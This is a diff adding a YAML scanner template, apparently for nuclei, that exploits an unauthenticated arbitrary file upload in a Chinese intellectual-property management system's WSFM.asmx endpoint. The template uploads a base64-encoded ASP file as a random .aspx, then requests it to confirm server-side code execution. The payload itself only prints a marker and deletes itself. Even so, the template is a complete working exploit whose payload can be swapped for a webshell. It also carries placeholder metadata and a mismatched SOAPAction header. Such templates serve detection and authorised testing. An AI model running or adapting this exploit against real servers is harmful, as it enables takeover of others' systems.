@@ -1,0 +1,38 @@
+id: wdzs-WSFM-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 唯徳知识产权管理系统 /AutoUpdate/WSFM.asmx 接口存在任意文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%94%AF%E5%BE%B3%E7%9F%A5%E8%AF%86%E4%BA%A7%E6%9D%83%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E5%94%AF%E5%BE%B3%E7%9F%A5%E8%AF%86%E4%BA%A7%E6%9D%83%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FWSFM.asmx%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}"
+http:
+  - raw:
+      - |-
+        POST /AutoUpdate/WSFM.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: 396
+        SOAPAction: "http://tempuri.org/DownloadFileWordTemplate"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <UploadFileWordTemplate xmlns="http://tempuri.org/">
+              <fileByteArray>PCUgUmVzcG9uc2UuV3JpdGUgY2hyKDEwMSkmY2hyKDQ5KSZjaHIoNTQpJmNocig1MykmY2hyKDUyKSZjaHIoNTApJmNocig0OSkmY2hyKDQ5KSZjaHIoNDkpJmNocig0OCkmY2hyKDk4KSZjaHIoOTcpJmNocig0OCkmY2hyKDUxKSZjaHIoNDgpJmNocig1NykmY2hyKDU3KSZjaHIoOTcpJmNocig0OSkmY2hyKDk5KSZjaHIoNDgpJmNocig1MSkmY2hyKDU3KSZjaHIoNTEpJmNocig1MSkmY2hyKDU1KSZjaHIoNTEpJmNocig5OSkmY2hyKDUzKSZjaHIoOTgpJmNocig1MikmY2hyKDUxKSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikuRGVsZXRlRmlsZShzZXJ2ZXIubWFwcGF0aChSZXF1ZXN0LlNlcnZlclZhcmlhYmxlcygiU0NSSVBUX05BTUUiKSkpICU+</fileByteArray>
+              <remotePath>/TemplateFiles/{{filename}}.aspx</remotePath>
+            </UploadFileWordTemplate>
+          </soap:Body>
+        </soap:Envelope>
+      - |+
+        GET /TemplateFiles/{{filename}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'e165421110ba03'
